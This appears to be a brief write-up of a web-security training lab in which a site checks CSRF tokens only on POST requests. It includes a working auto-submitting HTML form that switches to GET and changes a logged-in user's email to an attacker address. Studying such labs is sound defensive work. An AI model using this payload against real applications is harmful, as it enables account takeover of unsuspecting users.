CSRF where token validation depends on request method:

    -We use burp suite for this challenge to change the email after changing the request from POST to GET.
    -Applications attempts to secure the "/my-account/change-email"using anti-CSRF tokens.
    -The server only validates the token when the request is sent via POST,When the request method is changed to GET the application skips token verification allowing to proceed.
    -Create a exploit using a GET request to trigger the email change
    -<form action="https://0ad500450403536582ac4648017a0000.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="pwned@evil-domain.com">
    </form>
    <script>
        document.forms[0].submit();
    </script>
    -The same steps done in challenge 1
